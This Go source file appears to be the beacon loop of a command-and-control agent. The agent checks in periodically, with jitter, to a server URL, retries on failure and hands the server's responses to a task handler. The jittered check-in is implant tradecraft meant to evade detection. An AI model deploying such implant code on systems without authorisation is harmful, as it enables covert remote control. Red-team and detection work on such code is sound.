package beaconhandler

import (
	"fmt"
	"net/http"
	"time"

	httpFuncs "src/Client/beacon/http"
	"src/Client/generic/config"
	"src/Client/generic/logger"
)

// Beacon is the main agent loop, responsible for periodic check-ins to the server.
func Beacon() (error, bool) {
	logger.Log("Beacon loop initiated.")
	var switchSession bool
	// Initial validation before starting the loop.
	config.ConfigMutex.RLock()
	if config.ID == "" {
		config.ConfigMutex.RUnlock()
		logger.Fatal("Beacon cannot start with an empty agent ID.")
		return fmt.Errorf("agent ID is not set"), false
	}
	if config.Timer <= 0 {
		config.ConfigMutex.RUnlock()
		logger.Fatal(fmt.Sprintf("Beacon cannot start with an invalid timer: %d", config.Timer))
		return fmt.Errorf("initial timer is invalid: %d", config.Timer), false
	}
	config.ConfigMutex.RUnlock()

	for {
		// Get a snapshot of the current config for this iteration.
		config.ConfigMutex.RLock()
		timerForThisLoop := config.Timer
		jitterForThisLoop := config.Jitter
		config.ConfigMutex.RUnlock()

		// Calculate the sleep time for this iteration.
		sleepDuration := calculateSleepTime(timerForThisLoop, jitterForThisLoop)

		// Perform the beacon check-in.
		beaconCheckURL := httpFuncs.GenerateBeaconURL()
		logger.Log("Beaconing to: " + beaconCheckURL)
		responseCode, responseBody, _, err := httpFuncs.GetRequest(beaconCheckURL)

		// --- Handle GET Request Outcome ---
		if err != nil {
			logger.Error("Beacon GET request failed: " + err.Error())
			if retryErr := httpFuncs.RetryRequest(beaconCheckURL, 5, int(sleepDuration.Seconds())); retryErr != nil {
				logger.Error("Beacon retries failed: " + retryErr.Error())
				return fmt.Errorf("all beacon retries failed for %s: %w", beaconCheckURL, retryErr), false
			}
			logger.Log("Beacon retry successful.")
		} else if responseCode == http.StatusOK {
			logger.Log("Beacon GET successful (200 OK). Handling response.")
			go func() {
				switchSession = HandleResponse(responseBody)
			}()
		} else {
			logger.Warn(fmt.Sprintf("Beacon received non-200 status: %d. No action taken.", responseCode))
		}
		if switchSession {
			logger.Log("Switching session due to server request.")
			return nil, true
		}

		logger.Log(fmt.Sprintf("Beacon sleeping for %v.", sleepDuration))
		time.Sleep(sleepDuration)
	}
}
